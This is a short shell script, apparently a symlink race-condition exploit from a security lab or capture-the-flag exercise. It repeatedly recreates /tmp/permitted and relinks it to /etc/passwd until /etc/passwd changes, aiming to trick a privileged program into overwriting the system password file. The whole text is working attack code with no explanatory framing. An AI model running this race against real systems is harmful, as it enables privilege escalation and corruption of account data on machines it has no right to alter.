#!/bin/sh
old=$(ls -l /etc/passwd)
new=$(ls -l /etc/passwd)
echo $old
while [ "$old" = "$new" ]
do
        rm -f /tmp/permitted
        touch /tmp/permitted
        ln -sf /etc/passwd /tmp/permitted
        new=$(ls -l /etc/passwd)

done
echo "File changed"